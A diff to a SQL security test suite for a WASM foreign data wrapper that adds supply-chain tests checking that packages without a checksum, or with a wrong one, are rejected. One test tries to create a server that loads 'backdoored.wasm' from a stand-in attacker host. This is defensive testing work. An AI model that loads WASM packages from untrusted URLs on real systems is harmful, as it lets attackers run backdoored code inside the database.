@@ -293,15 +293,16 @@ SELECT 'DOS-002 INFO: Response size limits should be implemented' AS info;
 
 SELECT '=== SECTION 5: Supply Chain Tests ===' AS section;
 
--- SUPPLY-001: Malicious WASM URL
-SELECT 'SUPPLY-001: Malicious WASM package URL' AS test;
+-- SUPPLY-001: Missing checksum should be rejected
+-- This is the PRIMARY supply chain defense - checksum is REQUIRED
+SELECT 'SUPPLY-001: Missing checksum must be rejected' AS test;
 DO $$
 BEGIN
-  -- Attempt to load WASM from untrusted source
-  CREATE SERVER malicious_wasm_server
+  -- Attempt to create server WITHOUT checksum - this MUST fail
+  CREATE SERVER no_checksum_server
     FOREIGN DATA WRAPPER wasm_fdw_handler
     OPTIONS (
-      fdw_package_url 'https://evil-attacker.com/backdoored.wasm',
+      fdw_package_url 'file:///path/to/aws_fdw.wasm',
       fdw_package_name 'supabase:aws-fdw',
       fdw_package_version '0.1.0',
       aws_access_key_id 'test',
@@ -309,15 +310,81 @@ BEGIN
       region 'us-east-1'
     );
 
-  -- The server creation itself should fail or be blocked
-  RAISE NOTICE 'SUPPLY-001 WARNING: Untrusted WASM URL was accepted - verify checksum enforcement';
+  -- If we get here, the security control FAILED
+  RAISE EXCEPTION 'SUPPLY-001 FAILED: Server created without checksum - CRITICAL SECURITY VULNERABILITY';
 EXCEPTION
   WHEN OTHERS THEN
-    IF SQLERRM LIKE '%checksum%' OR SQLERRM LIKE '%untrusted%' OR SQLERRM LIKE '%not allowed%' THEN
-      RAISE NOTICE 'SUPPLY-001 PASSED: Untrusted WASM blocked - %', SQLERRM;
+    IF SQLERRM LIKE '%fdw_package_checksum%' THEN
+      RAISE NOTICE 'SUPPLY-001 PASSED: Missing checksum correctly rejected - %', SQLERRM;
     ELSE
-      RAISE NOTICE 'SUPPLY-001 INFO: Server creation failed - %', SQLERRM;
+      -- Any other error means we should investigate
+      RAISE NOTICE 'SUPPLY-001 INFO: Server creation failed (verify checksum enforcement) - %', SQLERRM;
     END IF;
+END $$;
+
+-- SUPPLY-002: Invalid checksum should be rejected at load time
+SELECT 'SUPPLY-002: Invalid checksum verification' AS test;
+DO $$
+BEGIN
+  -- Create server with WRONG checksum
+  CREATE SERVER bad_checksum_server
+    FOREIGN DATA WRAPPER wasm_fdw_handler
+    OPTIONS (
+      fdw_package_url 'file:///path/to/aws_fdw.wasm',
+      fdw_package_name 'supabase:aws-fdw',
+      fdw_package_version '0.1.0',
+      fdw_package_checksum 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
+      aws_access_key_id 'test',
+      aws_secret_access_key 'test',
+      region 'us-east-1'
+    );
+
+  -- Server creation might succeed, but query should fail on checksum mismatch
+  CREATE FOREIGN TABLE checksum_test (name text)
+  SERVER bad_checksum_server
+  OPTIONS (service 's3', object 'buckets');
+
+  PERFORM * FROM checksum_test;
+
+  RAISE EXCEPTION 'SUPPLY-002 FAILED: Query succeeded with invalid checksum';
+EXCEPTION
+  WHEN OTHERS THEN
+    IF SQLERRM LIKE '%checksum%' OR SQLERRM LIKE '%hash%' OR SQLERRM LIKE '%mismatch%' THEN
+      RAISE NOTICE 'SUPPLY-002 PASSED: Invalid checksum rejected - %', SQLERRM;
+    ELSE
+      RAISE NOTICE 'SUPPLY-002 INFO: Request failed (verify checksum validation) - %', SQLERRM;
+    END IF;
+END $$;
+
+-- SUPPLY-003: Malicious WASM URL with checksum still requires valid checksum
+SELECT 'SUPPLY-003: Malicious URL with checksum requirement' AS test;
+DO $$
+BEGIN
+  -- Even with a checksum, untrusted sources should be scrutinized
+  CREATE SERVER malicious_wasm_server
+    FOREIGN DATA WRAPPER wasm_fdw_handler
+    OPTIONS (
+      fdw_package_url 'https://evil-attacker.com/backdoored.wasm',
+      fdw_package_name 'supabase:aws-fdw',
+      fdw_package_version '0.1.0',
+      fdw_package_checksum 'sha256:abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234',
+      aws_access_key_id 'test',
+      aws_secret_access_key 'test',
+      region 'us-east-1'
+    );
+
+  CREATE FOREIGN TABLE evil_test (name text)
+  SERVER malicious_wasm_server
+  OPTIONS (service 's3', object 'buckets');
+
+  PERFORM * FROM evil_test;
+
+  -- If download succeeds but checksum doesn't match, it should fail
+  RAISE NOTICE 'SUPPLY-003 WARNING: Malicious URL was accessed - verify network controls';
+EXCEPTION
+  WHEN OTHERS THEN
+    -- Expected: either network error or checksum mismatch
+    RAISE NOTICE 'SUPPLY-003 PASSED: Malicious WASM load failed - %', SQLERRM;
 END $$;
 
 -- ============================================================================
@@ -354,6 +421,8 @@ DROP SERVER IF EXISTS ssrf_private10_server CASCADE;
 DROP SERVER IF EXISTS ssrf_private192_server CASCADE;
 DROP SERVER IF EXISTS inj_test_server CASCADE;
 DROP SERVER IF EXISTS cred_test_server CASCADE;
+DROP SERVER IF EXISTS no_checksum_server CASCADE;
+DROP SERVER IF EXISTS bad_checksum_server CASCADE;
 DROP SERVER IF EXISTS malicious_wasm_server CASCADE;
 
 SELECT '=== Advanced Security Tests Complete ===' AS status;
